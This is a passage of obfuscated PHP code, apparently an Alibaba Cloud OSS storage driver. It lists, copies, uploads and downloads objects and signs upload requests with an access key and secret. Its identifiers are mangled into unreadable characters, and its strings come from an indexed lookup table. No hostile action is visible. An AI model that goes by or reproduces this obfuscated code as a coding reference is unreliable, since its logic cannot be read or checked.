isset($ÓİĞÜ•[0]) ? $ÓİĞÜ•[0] : $ÑÃÓ¡Éˆ[12], $ÑÃÓ¡Éˆ[182] => isset($ëî†„Æ[0]) ? $ëî†„Æ[0] : $ÑÃÓ¡Éˆ[12]); } public function isBucketCors() { $‡Ú¦¢Öá =& $_SERVER[® ¨Ä®ñ]; $§¯Ì¤¾ = $this->getBucketCors(); if (!$§¯Ì¤¾ || !is_array($§¯Ì¤¾)) { return !1; } if ($§¯Ì¤¾[$‡Ú¦¢Öá[180]] != $‡Ú¦¢Öá[181] || $§¯Ì¤¾[$‡Ú¦¢Öá[182]] != $‡Ú¦¢Öá[181]) { return !1; } $¨õ’İò› = array_map($‡Ú¦¢Öá[183], $§¯Ì¤¾[$‡Ú¦¢Öá[184]]); if (!is_array($¨õ’İò›)) { $¨õ’İò› = array(); } $Â¦´°–ó = array($‡Ú¦¢Öá[185], $‡Ú¦¢Öá[186], $‡Ú¦¢Öá[187], $‡Ú¦¢Öá[188], $‡Ú¦¢Öá[189]); $´ôìŒ¥Ÿ = array_diff($Â¦´°–ó, $¨õ’İò›); return empty($´ôìŒ¥Ÿ); } public function mkfile($—ùÑÇ¢Ÿ, $âåú°—ü = '', $£Ö…Ä×ô = REPEAT_RENAME) { $ØÄù“¹Ì = $this->setContent($—ùÑÇ¢Ÿ, $âåú°—ü); if ($ØÄù“¹Ì !== !1) { return $this->getPathOuter($—ùÑÇ¢Ÿ); } return !1; } public function mkdir($Ç¹¦ùñ, $ù»ãØ´• = REPEAT_SKIP) { if ($this->_isFolder($Ç¹¦ùñ)) { return $this->getPathOuter($Ç¹¦ùñ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ç¹¦ùñ)); } catch (OSS\Core\OssException $“ñû÷‘È) { return !1; } return $this->getPathOuter($Ç¹¦ùñ); } private function fileList($êÜ—¼¤Ã, $´¢÷ìèÍ = '', $™õ øçš = 0) { $©Æ®ìÏÔ =& $_SERVER[® ¨Ä®ñ]; $êÜ—¼¤Ã = trim($êÜ—¼¤Ã, $©Æ®ìÏÔ[8]); $äàëş”³ = empty($êÜ—¼¤Ã) && $êÜ—¼¤Ã !== $©Æ®ìÏÔ[190] ? $©Æ®ìÏÔ[12] : $êÜ—¼¤Ã . $©Æ®ìÏÔ[8]; $Ä¯Á„Â = $©Æ®ìÏÔ[12]; $ã÷É½ñé = 1000; $Æµ††Á = $this->listItemCache === !1 ? !1 : !0; $ø¼É—¹ = $çÅÆî  = array(); while (!0) { check_abort(); $úñìš‰® = array($©Æ®ìÏÔ[1375] => $´¢÷ìèÍ, $©Æ®ìÏÔ[1376] => $äàëş”³, $©Æ®ìÏÔ[1377] => $ã÷É½ñé, $©Æ®ìÏÔ[1378] => $Ä¯Á„Â); try { $÷ÀÙòÊ• = $this->client->listObjects($this->bucket, $úñìš‰®); } catch (OSS\Core\OssException $úÍãÌÎ¡) { break; } $Ä¯Á„Â = $÷ÀÙòÊ•->getNextMarker(); $Ë‡Ò«¯Ö = $÷ÀÙòÊ•->getObjectList(); $´äá•ßô = $÷ÀÙòÊ•->getPrefixList(); foreach ($Ë‡Ò«¯Ö as $õÔÜóÙ) { if ($õÔÜóÙ->getKey() == $äàëş”³) { continue; } $òËîÃ¯ã = $õÔÜóÙ->getKey(); $»“³óÍï = $õÔÜóÙ->getSize(); $îİ”Ğ¦ı = $õÔÜóÙ->getLastModified(); $ÖÆ¸åáµ = $™õ øçš ? array($©Æ®ìÏÔ[32] => $òËîÃ¯ã, $©Æ®ìÏÔ[80] => $»“³óÍï, $©Æ®ìÏÔ[196] => strtotime($îİ”Ğ¦ı)) : $òËîÃ¯ã; $›Î¿çúª = $»“³óÍï == 0 && substr($òËîÃ¯ã, strlen($òËîÃ¯ã) - 1, 1) == $©Æ®ìÏÔ[8] ? !0 : !1; if ($Æµ††Á) { $this->cacheMethod($©Æ®ìÏÔ[198], $òËîÃ¯ã, $›Î¿çúª); $this->cacheMethod($©Æ®ìÏÔ[199], $òËîÃ¯ã, array($©Æ®ìÏÔ[80] => $»“³óÍï, $©Æ®ìÏÔ[1379] => $»“³óÍï, $©Æ®ìÏÔ[86] => strtotime($îİ”Ğ¦ı), $©Æ®ìÏÔ[1380] => $îİ”Ğ¦ı)); } if ($›Î¿çúª) { $ø¼É—¹[] = $òËîÃ¯ã; continue; } $çÅÆî [] = $ÖÆ¸åáµ; } foreach ($´äá•ßô as $Øå¨ß¦) { $ø¼É—¹[] = $Øå¨ß¦->getPrefix(); if ($Æµ††Á) { $this->cacheMethod($©Æ®ìÏÔ[198], $òËîÃ¯ã, !0); } } if ($Ä¯Á„Â === $©Æ®ìÏÔ[12]) { break; } } if ($Æµ††Á) { $this->cacheMethod($©Æ®ìÏÔ[198], $êÜ—¼¤Ã, !0); } return array($©Æ®ìÏÔ[77] => $ø¼É—¹, $©Æ®ìÏÔ[76] => $çÅÆî ); } public function copyFile($õç¸ŞÎİ, $‚íÈŠÌ¥) { $‚ö’íá¸ = $this->size($õç¸ŞÎİ); if ($‚ö’íá¸ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $õç¸ŞÎİ, $this->bucket, $this->pathEncode($‚íÈŠÌ¥)); } catch (OSS\Core\OssException $è²Æ¹›) { return !1; } return $this->getPathOuter($‚íÈŠÌ¥); } $‰ù“ë°ö = $this->multiCopyObject($õç¸ŞÎİ, $‚íÈŠÌ¥, $‚ö’íá¸); return $‰ù“ë°ö ? $this->getPathOuter($‚íÈŠÌ¥) : !1; } private function multiCopyObject($ü—ıå, $ÉçîŞÛğ, $ŸÙõÃÛ¸) { $®Ô·Ë‡” =& $_SERVER[® ¨Ä®ñ]; try { $ñÅ’ˆ¾¯ = array(); if ($ØıêëİŸ = $this->hashMd5($ü—ıå)) { $ñÅ’ˆ¾¯ = array(OSS\OssClient::OSS_HEADERS => array($®Ô·Ë‡”[1381] => $ØıêëİŸ)); } $ŸÙÒòÖ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÉçîŞÛğ), $ñÅ’ˆ¾¯); $êÆ‹²—¿ = 1; $ÌÆ—ÊÑ© = 0; $Çş‹Ã­¸ = array(); $Ô£‚¨²½ = 1024 * 1024 * 10; $¼Ş•îÆ = $this->client->generateMultiuploadParts($ŸÙõÃÛ¸, $Ô£‚¨²½); foreach ($¼Ş•îÆ as $‰îÀ«Öõ => $›ˆ“» ¾) { $µÌ–Èİ = $ÌÆ—ÊÑ© + (int) $›ˆ“» ¾[$®Ô·Ë‡”[1382]]; $ØŒµ‹å¾ = (int) $›ˆ“» ¾[$®Ô·Ë‡”[332]] + $µÌ–Èİ - 1; $…éŠÌ— = array($®Ô·Ë‡”[1383] => $µÌ–Èİ, $®Ô·Ë‡”[1384] => $ØŒµ‹å¾); $Çş‹Ã­¸[] = $this->client->uploadPartCopy($this->bucket, $ü—ıå, $this->bucket, $this->pathEncode($ÉçîŞÛğ), $êÆ‹²—¿, $ŸÙÒòÖ, $…éŠÌ—); $êÆ‹²—¿ = $êÆ‹²—¿ + 1; } $µ›‰²”¾ = array(); foreach ($Çş‹Ã­¸ as $‰îÀ«Öõ => $È­ ü¿) { $µ›‰²”¾[] = array($®Ô·Ë‡”[1385] => $‰îÀ«Öõ + 1, $®Ô·Ë‡”[1386] => $È­ ü¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÉçîŞÛğ), $ŸÙÒòÖ, $µ›‰²”¾); } catch (OSS\Core\OssException $‡ã¯ÃÍî) { return !1; } return !0; } public function moveFile($¹ˆ’îË, $âõÌ®©) { if ($this->copyFile($¹ˆ’îË, $âõÌ®©)) { $this->remove($¹ˆ’îË); return $this->getPathOuter($âõÌ®©); } return !1; } public function delFile($Ÿ¸é®‰ä) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ÿ¸é®‰ä)); } catch (OSS\Core\OssException $­ËÊ…ï) { return !1; } return !0; } public function delFolder($œª•İ›) { $œ„ŒŞ® =& $_SERVER[® ¨Ä®ñ]; if (!$this->exist($œª•İ›)) { return !0; } $this->listItemCache = !1; $ÛÙÎ±™å = $this->fileList($œª•İ›); $this->listItemCache = !0; $ÁÚî·¸Ä = trim($œª•İ›, $œ„ŒŞ®[8]) . $œ„ŒŞ®[8]; if (!empty($œª•İ›) && $œª•İ› !== $œ„ŒŞ®[190] && !in_array($ÁÚî·¸Ä, $ÛÙÎ±™å[$œ„ŒŞ®[77]])) { $ÛÙÎ±™å[$œ„ŒŞ®[77]][] = $ÁÚî·¸Ä; } $Äõ˜¾ê³ = $this->delByBatch($ÛÙÎ±™å[$œ„ŒŞ®[76]]); if (!$Äõ˜¾ê³) { return !1; } $Äõ˜¾ê³ = $this->delByBatch($ÛÙÎ±™å[$œ„ŒŞ®[77]]); if (!$Äõ˜¾ê³) { return !1; } return $this->delFile($ÁÚî·¸Ä); } private function delByBatch($°üÅ·ıÄ) { foreach (array_chunk($°üÅ·ıÄ, 1000) as $ğ†Éüòï) { try { $this->client->deleteObjects($this->bucket, $ğ†Éüòï); } catch (OSS\Core\OssException $»¹Ğ¿È¿) { return !1; } } return !0; } public function rename($ù«ÖèÀ¿, $°½˜é‡Ÿ) { return $this->renameObject($ù«ÖèÀ¿, $°½˜é‡Ÿ); } private function fileInfo($ÒÂç¼ù…, $‹»åÉ®é = false, $½éÔíì = array()) { $³ÄôÆı€ =& $_SERVER[® ¨Ä®ñ]; $İùÏß°Õ = array($³ÄôÆı€[32] => $this->pathThis($ÒÂç¼ù…), $³ÄôÆı€[78] => $this->getPathOuter($ÒÂç¼ù…), $³ÄôÆı€[33] => $³ÄôÆı€[192], $³ÄôÆı€[80] => isset($½éÔíì[$³ÄôÆı€[80]]) ? $½éÔíì[$³ÄôÆı€[80]] : 0, $³ÄôÆı€[167] => $this->ext($ÒÂç¼ù…)); if ($‹»åÉ®é) { return $İùÏß°Õ; } $İùÏß°Õ[$³ÄôÆı€[193]] = $İùÏß°Õ[$³ÄôÆı€[86]] = 0; $İùÏß°Õ[$³ÄôÆı€[194]] = $İùÏß°Õ[$³ÄôÆı€[195]] = !0; if (empty($½éÔíì)) { $ÖİôÄŞÍ = $this->objectMeta($ÒÂç¼ù…); if (!$ÖİôÄŞÍ) { return $İùÏß°Õ; } $½éÔíì = array($³ÄôÆı€[86] => strtotime($ÖİôÄŞÍ[$³ÄôÆı€[1380]]), $³ÄôÆı€[80] => $ÖİôÄŞÍ[$³ÄôÆı€[1379]] + 0); } if (isset($½éÔíì[$³ÄôÆı€[80]])) { $İùÏß°Õ[$³ÄôÆı€[80]] = $½éÔíì[$³ÄôÆı€[80]]; } if (isset($½éÔíì[$³ÄôÆı€[86]])) { $İùÏß°Õ[$³ÄôÆı€[86]] = $½éÔíì[$³ÄôÆı€[86]]; } if (isset($½éÔíì[$³ÄôÆı€[196]]) && !trim($İùÏß°Õ[$³ÄôÆı€[86]])) { $İùÏß°Õ[$³ÄôÆı€[86]] = $½éÔíì[$³ÄôÆı€[196]]; } return $İùÏß°Õ; } private function folderInfo($Ô¤·á£Ø, $“ø·ªøì = false, $ØüÇÙ“ = array()) { $á›Áµ«ş =& $_SERVER[® ¨Ä®ñ]; $Ì´ä¢—‘ = array($á›Áµ«ş[32] => $this->pathThis($Ô¤·á£Ø), $á›Áµ«ş[78] => $this->getPathOuter($á›Áµ«ş[8] . $Ô¤·á£Ø), $á›Áµ«ş[33] => $á›Áµ«ş[79]); if ($“ø·ªøì) { return $Ì´ä¢—‘; } $Ì´ä¢—‘[$á›Áµ«ş[193]] = $Ì´ä¢—‘[$á›Áµ«ş[86]] = 0; $Ì´ä¢—‘[$á›Áµ«ş[194]] = $Ì´ä¢—‘[$á›Áµ«ş[195]] = !0; if (empty($ØüÇÙ“)) { $Ô¤·á£Ø = rtrim($Ô¤·á£Ø, $á›Áµ«ş[8]) . $á›Áµ«ş[8]; $ÚÑßˆ© = $this->objectMeta($Ô¤·á£Ø); if (!$ÚÑßˆ©) { return $Ì´ä¢—‘; } $ØüÇÙ“ = array($á›Áµ«ş[193] => $ÚÑßˆ©[$á›Áµ«ş[502]][$á›Áµ«ş[1387]], $á›Áµ«ş[86] => strtotime($ÚÑßˆ©[$á›Áµ«ş[1380]])); } if (isset($ØüÇÙ“[$á›Áµ«ş[86]])) { $Ì´ä¢—‘[$á›Áµ«ş[86]] = $ØüÇÙ“[$á›Áµ«ş[86]]; } if (isset($ØüÇÙ“[$á›Áµ«ş[193]])) { $Ì´ä¢—‘[$á›Áµ«ş[193]] = $ØüÇÙ“[$á›Áµ«ş[193]]; } return $Ì´ä¢—‘; } public function listPath($×Äßüğü, $¾î¿÷ã = false) { $¤ Æœ‰æ =& $_SERVER[® ¨Ä®ñ]; $õ©´È™ù = $this->fileList($×Äßüğü, $¤ Æœ‰æ[8], !0); foreach ($õ©´È™ù[$¤ Æœ‰æ[77]] as $¥ÒáÙùá => $ ££®§€) { $õ©´È™ù[$¤ Æœ‰æ[77]][$¥ÒáÙùá] = $this->folderInfo($ ££®§€, $¾î¿÷ã, $ ££®§€); } foreach ($õ©´È™ù[$¤ Æœ‰æ[76]] as $¥ÒáÙùá => $ ££®§€) { $õ©´È™ù[$¤ Æœ‰æ[76]][$¥ÒáÙùá] = $this->fileInfo($ ££®§€[$¤ Æœ‰æ[32]], $¾î¿÷ã, $ ££®§€); } return $õ©´È™ù; } public function has($»¥ œ¦¤, $¶§ä»Åï = false, $Ù”Š‘ÒŠ = true) { $ı•ïş·ú =& $_SERVER[® ¨Ä®ñ]; $»¥ œ¦¤ = trim($»¥ œ¦¤, $ı•ïş·ú[8]); $±½Šåş = empty($»¥ œ¦¤) && $»¥ œ¦¤ !== $ı•ïş·ú[190] ? $ı•ïş·ú[12] : $»¥ œ¦¤ . $ı•ïş·ú[8]; $—á‰òµ© = $ı•ïş·ú[12]; $ë¹òâô… = 500; $ïÏôÜ­° = $è×ö’°… = 0; while (!0) { check_abort(); $ôÎÁœ×Û = array($ı•ïş·ú[1375] => $ı•ïş·ú[8], $ı•ïş·ú[1376] => $±½Šåş, $ı•ïş·ú[1377] => $ë¹òâô…, $ı•ïş·ú[1378] => $—á‰òµ©); try { $¿‡ñ‹Òí = $this->client->listObjects($this->bucket, $ôÎÁœ×Û); } catch (OSS\Core\OssException $ÚµğíÆ†) { break; } $—á‰òµ© = $¿‡ñ‹Òí->getNextMarker(); $æ¾–‰’£ = $¿‡ñ‹Òí->getObjectList(); $ó¸Ÿ¹İ = $¿‡ñ‹Òí->getPrefixList(); if ($¶§ä»Åï) { if (count($æ¾–‰’£) > 1 || count($æ¾–‰’£) == 1 && $æ¾–‰’£[0]->getKey() != $±½Šåş) { $ïÏôÜ­° += count($æ¾–‰’£) - 1; } if (!empty($ó¸Ÿ¹İ)) { $è×ö’°… += count($ó¸Ÿ¹İ); } if ($—á‰òµ© === $ı•ïş·ú[12]) { break; } continue; } if ($Ù”Š‘ÒŠ) { if (!empty($æ¾–‰’£)) { if (count($æ¾–‰’£) > 1 || $æ¾–‰’£[0]->getKey() != $±½Šåş) { return !0; } } } else { if (!empty($ó¸Ÿ¹İ)) { return !0; } } if ($—á‰òµ© === $ı•ïş·ú[12]) { break; } } if ($¶§ä»Åï) { return array($ı•ïş·ú[202] => $ïÏôÜ­°, $ı•ïş·ú[203] => $è×ö’°…); } return !1; } public function listAll($—¼óıé£) { $”·Ü—©Ş =& $_SERVER[® ¨Ä®ñ]; $ŸÏÖ®” = $this->fileList($—¼óıé£, $”·Ü—©Ş[12], !0); $¾Úôš‹¤ = array(); foreach ($ŸÏÖ®”[$”·Ü—©Ş[76]] as $Ş›¯³Ìô) { $¾Úôš‹¤[$Ş›¯³Ìô[$”·Ü—©Ş[32]]] = $Ş›¯³Ìô[$”·Ü—©Ş[80]]; } foreach ($ŸÏÖ®”[$”·Ü—©Ş[77]] as $Ş›¯³Ìô) { if (is_string($Ş›¯³Ìô)) { $¾Úôš‹¤[$Ş›¯³Ìô] = 0; } } return $this->listAllFiles($—¼óıé£, array_keys($¾Úôš‹¤), $¾Úôš‹¤); } public function canRead($¡ºãñÉÒ) { $Ş¼¬Ñš =& $_SERVER[® ¨Ä®ñ]; $ŠàüÊó  = $this->pathAcl($¡ºãñÉÒ); return $ŠàüÊó  == $Ş¼¬Ñš[1388] || $ŠàüÊó  == $Ş¼¬Ñš[541] ? !0 : !1; } public function canWrite($ÔÍ»áŞä) { $öÁ®Õ¡ = $this->pathAcl($ÔÍ»áŞä); return $öÁ®Õ¡ == $_SERVER[® ¨Ä®ñ][541] ? !0 : !1; } public function pathAcl($ùë§›°ù) { $‚»…œà =& $_SERVER[® ¨Ä®ñ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ŸÔª© = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ùë§›°ù)); } catch (OSS\Core\OssException $¥¤é¶ˆ›) { return !1; } $ó‚¹çÄÉ = $ŸÔª© == $‚»…œà[37] ? $this->bucketAcl : $ŸÔª©; if ($ó‚¹çÄÉ == $‚»…œà[1389]) { return $‚»…œà[1388]; } if ($ó‚¹çÄÉ == $‚»…œà[1390]) { return $‚»…œà[541]; } return $ó‚¹çÄÉ; } private function chmodPath($’ÊÖÅı¨, $µŸîÒÔ‚ = '') { $¼ï´ûíº =& $_SERVER[® ¨Ä®ñ]; $×ÄÂ¡‰Å = empty($µŸîÒÔ‚) ? $¼ï´ûíº[1390] : $µŸîÒÔ‚; $Ä‡ğ—êì = array($¼ï´ûíº[37], $¼ï´ûíº[191], $¼ï´ûíº[1389], $¼ï´ûíº[1390]); if (!in_array($×ÄÂ¡‰Å, $Ä‡ğ—êì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($’ÊÖÅı¨), $×ÄÂ¡‰Å); } catch (OSS\Core\OssException $¶æÄ¹”) { return !1; } return !0; } public function getContent($à˜³öĞ) { return $this->fileSubstr($à˜³öĞ, -1); } public function setContent($—Ôœ¾âÚ, $íÆ˜¸’© = '') { $÷ìŒÛƒí =& $_SERVER[® ¨Ä®ñ]; try { $Ïç®¦ë = $this->trafficLimit($÷ìŒÛƒí[1391]); $®öÊ¸‹õ = $this->client->putObject($this->bucket, $this->pathEncode($—Ôœ¾âÚ), $íÆ˜¸’©, $Ïç®¦ë); } catch (OSS\Core\OssException $‡šôîÍ×) { return !1; } $öÂ‹şûè = array($÷ìŒÛƒí[1381] => trim($®öÊ¸‹õ[$÷ìŒÛƒí[1392]], $÷ìŒÛƒí[117]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—Ôœ¾âÚ))); $this->updateObjMeta($—Ôœ¾âÚ, $öÂ‹şûè); return isset($®öÊ¸‹õ[$÷ìŒÛƒí[1393]][$÷ìŒÛƒí[1340]]) ? !0 : !1; } private function updateObjMeta($ßİÃ³, $Œí•™») { $ßİÃ³ = $this->pathEncode($ßİÃ³); try { $ÄŠ‘ÍÉ« = array(OSS\OssClient::OSS_HEADERS => $Œí•™»); $this->client->copyObject($this->bucket, $ßİÃ³, $this->bucket, $ßİÃ³, $ÄŠ‘ÍÉ«); } catch (OSS\Core\OssException $½†ºùüø) { return !1; } return !0; } public function upload($šÈ¥ç ¬, $¡ƒÍ¨ºë, $çÓèøıÑ = false, $Ë¨Å€ªá = REPEAT_REPLACE) { $áÂÉÄ‘˜ =& $_SERVER[® ¨Ä®ñ]; $åÉıŠëÅ = trim($šÈ¥ç ¬, $áÂÉÄ‘˜[8]); $êµÌÇŞ² = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($áÂÉÄ‘˜[1381] => @md5_file($¡ƒÍ¨ºë)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($šÈ¥ç ¬))); $êµÌÇŞ² = $this->trafficLimit($áÂÉÄ‘˜[1391], $êµÌÇŞ²); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($åÉıŠëÅ), $¡ƒÍ¨ºë, $êµÌÇŞ²); } catch (OSS\Core\OssException $ŸÈ¶èğ) { return !1; } return $this->getPathOuter($šÈ¥ç ¬); } public function getHost() { $áÇÁäÔ§ =& $_SERVER[® ¨Ä®ñ]; $Óœ£¶îÓ = explode($áÇÁäÔ§[176], parent::getHost()); return $Óœ£¶îÓ[0] . $áÇÁäÔ§[176] . $this->bucket . $áÇÁäÔ§[10] . $Óœ£¶îÓ[1]; } public function uploadFormData($“Š¥®‚ß, $‹ĞÎ¨‰ø = 3600) { $èìù×ï… =& $_SERVER[® ¨Ä®ñ]; if (!($¶Ü§Ê¢ı = $this->getHost())) { return !1; } $ù”¢ë‹¶ = $‹ĞÎ¨‰ø; $Šüˆ¯çØ = date($èìù×ï…[1394], time() + $ù”¢ë‹¶); $¿ôÉŞô² = new DateTime($Šüˆ¯çØ); $­öÒò…‹ = $¿ôÉŞô²->format(DateTime::ISO8601); $¼¨ı¥”¶ = strpos($­öÒò…‹, $èìù×ï…[291]); $­öÒò…‹ = substr($­öÒò…‹, 0, $¼¨ı¥”¶) . $èìù×ï…[1395]; $Å€Şû˜ = 1048576000 * 5; $²ıÔôÂ = $this->pathFather($“Š¥®‚ß); $ÛÇî£îĞ = array($èìù×ï…[1294] => $­öÒò…‹, $èìù×ï…[1295] => array(array($èìù×ï…[1396], 0, $Å€Şû˜), array($èìù×ï…[1298], $èìù×ï…[1299], $²ıÔôÂ))); $°µñèò‰ = base64_encode(json_encode($ÛÇî£îĞ)); $ÁÍ’ŞÇ = base64_encode(hash_hmac($èìù×ï…[227], $°µñèò‰, $this->secret, !0)); $º¤Âƒöå = array($èìù×ï…[1304] => $°µñèò‰, $èìù×ï…[1397] => $this->accessKey, $èìù×ï…[1300] => $èìù×ï…[1292], $èìù×ï…[1398] => $ÁÍ’ŞÇ, $èìù×ï…[174] => $¶Ü§Ê¢ı); $º¤Âƒöå = $this->trafficLimit($èìù×ï…[1391], $º¤Âƒöå); return $º¤Âƒöå; } public function multiUploadFormData($¼ú‰ˆİ±, $ûÚŒ€ê = 3600) { $¾í÷¼À =& $_SERVER[® ¨Ä®ñ]; if (!($·êé»ğ = $this->getHost())) { return !1; } $óÊº  = $this->trafficLimit($¾í÷¼À[1391]); $ñåàáÏ© = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¼ú‰ˆİ±), $óÊº ); return array($¾í÷¼À[218] => $ñåàáÏ©, $¾í÷¼À[174] => $·êé»ğ . $¾í÷¼À[8] . $this->pathEncode($¼ú‰ˆİ±), $¾í÷¼À[219] => gmdate($¾í÷¼À[1399]), $¾í÷¼À[95] => $¼ú‰ˆİ±); } public function multiUploadAuthData($é•ƒ±´Ó, $Û®òæ—¯ = array()) { $ÓİøëÑ =& $_SERVER[® ¨Ä®ñ]; $ËÍçªˆß = isset($Û®òæ—¯[$ÓİøëÑ[219]]) ? $Û®òæ—¯[$ÓİøëÑ[219]] : gmdate($ÓİøëÑ[1399]); $Åğ¾“âõ = isset($Û®òæ—¯[$ÓİøëÑ[167]]) ? $Û®òæ—¯[$ÓİøëÑ[167]] : $ÓİøëÑ[12]; $âàşûôÚ = $é•ƒ±´Ó; if (isset($Û®òæ—¯[$ÓİøëÑ[95]])) { $âàşûôÚ = $Û®òæ—¯[$ÓİøëÑ[95]]; unset($Û®òæ—¯[$ÓİøëÑ[95]]); } if (isset($Û®òæ—¯[$ÓİøëÑ[220]])) { $Û®òæ—¯[$ÓİøëÑ[219]] = $ËÍçªˆß; return $this->listUploadParts($âàşûôÚ, $Û®òæ—¯); } $ÙÆ­™÷ó = array($ÓİøëÑ[221], $ÓİøëÑ[12], $ÓİøëÑ[118], $ËÍçªˆß, "\170\x2d\157\x73\163\55\x64\x61\x74\x65\72{$ËÍçªˆß}", $ÓİøëÑ[8] . $this->bucket . $ÓİøëÑ[8] . $âàşûôÚ . $Åğ¾“âõ); if (strpos($Åğ¾“âõ, $ÓİøëÑ[222]) === 0) { $ÙÆ­™÷ó[0] = $ÓİøëÑ[223]; if ($ÏäªÄ·— = $this->trafficLimit($ÓİøëÑ[1391])) { $âàşûôÚ = $ÓİøëÑ[1400]; array_splice($ÙÆ­™÷ó, 5, 0, $âàşûôÚ . $ÓİøëÑ[4] . $ÏäªÄ·—[$âàşûôÚ]); } } if (isset($Û®òæ—¯[$ÓİøëÑ[224]]) && $Û®òæ—¯[$ÓİøëÑ[224]] == $ÓİøëÑ[225]) { $ÙÆ­™÷ó[0] = $ÓİøëÑ[225]; } if (!empty($Û®òæ—¯[$ÓİøëÑ[1401]])) { $¶ú©Øë = array_merge(array($ÙÆ­™÷ó[4]), $Û®òæ—¯[$ÓİøëÑ[1401]]); sort($¶ú©Øë); $ÙÆ­™÷ó[4] = implode($ÓİøëÑ[226], $¶ú©Øë); } $»†ú±–“ = implode($ÓİøëÑ[226], $ÙÆ­™÷ó); $ë§Ä‹£· = base64_encode(hash_hmac($ÓİøëÑ[227], $»†ú±–“, $this->secret, !0)); $€“Úü½Ë = $ÓİøëÑ[1365] . $this->accessKey . $ÓİøëÑ[4] . $ë§Ä‹£·; if (strpos($Åğ¾“âõ, $ÓİøëÑ[222]) === 0) { $€“Úü½Ë = array($ÓİøëÑ[229] => $€“Úü½Ë, $ÓİøëÑ[219] => $ËÍçªˆß); if ($ÏäªÄ·—) { $€“Úü½Ë = array_merge($€“Úü½Ë, $ÏäªÄ·—); } } return $€“Úü½Ë; } public function listUploadParts($¾…®¼±”, $ÄÔÃÄËû) { $÷£ÎÌ ¼ =& $_SERVER[® ¨Ä®ñ]; $ê»ÇåÚ³ = parse_url_query($ÄÔÃÄËû[$÷£ÎÌ ¼[167]]); $‡åï³»µ = $this->client->listParts($this->bucket, $this->pathEncode($¾…®¼±”), $ê»ÇåÚ³[$÷£ÎÌ ¼[218]]); $çù«‰ÒÃ = $‡åï³»µ->getListPart(); $©ñã¨åá = array(); foreach ($çù«‰ÒÃ as $×Á½Ùƒù) { $©ñã¨åá[] = array($÷£ÎÌ ¼[1385] => $×Á½Ùƒù->getPartNumber(), $÷£ÎÌ ¼[1386] => trim($×Á½Ùƒù->getETag(), $÷£ÎÌ ¼[117])); } unset($ÄÔÃÄËû[$÷£ÎÌ ¼[220]], $ÄÔÃÄËû[$÷£ÎÌ ¼[224]]); $ÆëòïÔ = $this->multiUploadAuthData($¾…®¼±”, $ÄÔÃÄËû); if (empty($ÆëòïÔ)) { return !1; } return array($÷£ÎÌ ¼[229] => $ÆëòïÔ, $÷£ÎÌ ¼[219] => $ÄÔÃÄËû[$÷£ÎÌ ¼[219]], $÷£ÎÌ ¼[231] => $©ñã¨åá); } public function download($Ìˆı†´Ì, $ËÀ—òË¸) { if ($this->isFolder($Ìˆı†´Ì)) { return !1; } try { $Æí‚ğ¯à = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ËÀ—òË¸); $Æí‚ğ¯à = $this->trafficLimit($_SERVER[® ¨Ä®ñ][110], $Æí‚ğ¯à); $this->client->getObject($this->bucket, $this->pathEncode($Ìˆı†´Ì), $Æí‚ğ¯à); } catch (OSS\Core\OssException $Ü–Ñ§úù) { return !1; } return $ËÀ—òË¸; } public function fileSubstr($›—‡ê®è, $¥œó”œÅ = 0, $µº‡Ò²Í = false) { if ($¥œó”œÅ === -1) { $ßØõ€ã = array(); } else { if ($µº‡Ò²Í === !1) { $Î°ŸıÒÎ = $this->size($›—‡ê®è); } else { $Î°ŸıÒÎ = $¥œó”œÅ + $µº‡Ò²Í - 1; } $ßØõ€ã = array(OSS\OssClient::OSS_RANGE => "{$¥œó”œÅ}\x2d{$Î°ŸıÒÎ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($›—‡ê®è), $ßØõ€ã); } catch (OSS\Core\OssException $”‚¨ïÊØ) { think_exception($”‚¨ïÊØ->getMessage()); return !1; } } private function trafficLimit($õéë¥åÖ, $€ûş¬ó = array()) { $§ôÀªÈ =& $_SERVER[® ¨Ä®ñ]; if ($õéë¥åÖ == $§ôÀªÈ[1391] && $this->isUploadServer() || $õéë¥åÖ == $§ôÀªÈ[110] && $this->isFileOutServer()) { return $€ûş¬ó; } $“–§•†ó = floatval($GLOBALS[$§ôÀªÈ[6]][$§ôÀªÈ[90]][$§ôÀªÈ[108]][$õéë¥åÖ]) * 1024 * 1024 * 8; if (!$“–§•†ó) { return $€ûş¬ó; } $“–§•†ó = $“–§•†ó < 819200 ? 819200 : ($“–§•†ó > 838860800 ? 838860800 : $“–§•†ó); $€ûş¬ó[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($“–§•†ó); return $€ûş¬ó; } public function link($‡®’¨, $©ºÎ‡ÇÀ = array()) { $š³óšÆè =& $_SERVER[® ¨Ä®ñ]; if (!$this->exist($‡®’¨) || $this->isFolder($‡®’¨)) { return !1; } try { $©ºÎ‡ÇÀ = $this->trafficLimit($š³óšÆè[110], $©ºÎ‡ÇÀ); $§ÎŒ˜ºù = $this->client->signUrl($this->bucket, $this->pathEncode($‡®’¨), 3600 * 12, $š³óšÆè[225], $©ºÎ‡ÇÀ); return $this->getCdnLink($§ÎŒ˜ºù); } catch (OSS\Core\OssException $…áÂ¤²Ê) { return !1; } } public function fileOut($­¹ƒ°Ï¶, $æğÄÖ¡ = false, $á ò”¿® = false, $ÔŒ®¦‘¦ = '') { $òçÉò =& $_SERVER[® ¨Ä®ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($­¹ƒ°Ï¶, $æğÄÖ¡, $á ò”¿®, $ÔŒ®¦‘¦); } if (!$á ò”¿®) { $á ò”¿® = $this->pathThis($­¹ƒ°Ï¶); } $á ò”¿® = rawurlencode($á ò”¿®); $ÕïÜ—ÛĞ = 